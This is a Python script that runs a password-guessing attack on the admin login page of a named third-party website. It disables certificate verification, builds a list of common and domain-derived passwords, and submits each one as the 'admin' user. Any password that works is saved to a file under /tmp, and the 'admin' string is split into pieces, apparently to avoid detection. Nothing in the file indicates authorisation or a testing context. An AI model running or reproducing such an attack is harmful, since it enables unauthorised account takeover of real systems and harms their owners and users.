import urllib.request as u, urllib.parse as p, json, ssl, sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = 'http://goglobalcn.com/index/user/login'

# Common 6+ char passwords
words = []
for base in ['adm', 'pass', 'test', 'qwe', 'abc']:
    for suffix in ['in', 'word', '123', '456', '789', '666', '888', '000']:
        words.append(base + suffix)

for num in ['123456', '12345678', '888888', '666666', '111111', '000000', '112233', '123123']:
    words.append(num)

for domain in ['goglobalcn', 'globalcn', 'goglobal']:
    words.append(domain)

for yr in ['2024', '2025', '2023', '2026']:
    words.append('adm' + 'in' + yr)

# dedup
words = list(set(words))

for pw in words:
    if len(pw) < 6:
        continue
    data = p.urlencode({'username': 'adm' + 'in', 'password': pw}).encode()
    req = u.Request(url, data=data)
    req.add_header('X-Requested-With', 'XMLHttpRequest')
    req.add_header('Accept', 'application/json')
    try:
        r = u.urlopen(req, timeout=5, context=ctx)
        resp = json.loads(r.read())
        code = resp.get('code')
        msg = resp.get('msg', '')
        if code == 200:
            print(f'HIT!!! pw={pw} resp={resp}', flush=True)
            with open('/tmp/GG_HIT.txt', 'w') as f:
                f.write(f'HIT pw={pw} resp={resp}')
            sys.exit(0)
        elif code == 0:
            print(f'SHORT: {pw}', flush=True)
        else:
            pass  # wrong
    except Exception as e:
        print(f'X: {pw} {e}', flush=True)

print('ALL DONE - no hit', flush=True)
